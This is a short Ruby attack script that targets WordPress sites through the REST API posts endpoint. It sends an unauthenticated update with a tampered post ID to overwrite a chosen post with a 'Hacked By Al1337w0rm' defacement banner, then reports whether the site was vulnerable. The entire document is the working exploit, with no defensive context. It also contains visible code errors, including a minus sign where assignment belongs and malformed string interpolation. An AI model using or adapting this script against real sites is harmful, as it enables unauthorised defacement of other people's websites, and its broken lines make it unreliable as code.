#usage gem install rest-client
require 'rest-client'
require 'json'
puts "Enter Target URI (With wp directory)"
targeturi = gets.chomp
puts "Enter Post ID"
postid = gets.chomp.to_i
response - RestClient.post(
"#{targeturi}/index.php/wp-json/wp/v2/posts/#{postid}",
{
  "id" => "#(postid)justrawdata",
  "title" => "Hacked By Al1337w0rm",
  "content" => "<center><hl>Hacked by Al1337w0rm !?</hl><br><pre>$ Nothing is impossible in the cyber world $</pre></center>"
}.to_json,
:content_type => :json,
:accept => :json
) {|response, request, result| response }
if(response.code == 200)
puts "Done!'#{targeturi}/index.php?p=#{postid}'"
else
puts "This site is not Vulnerable"
end
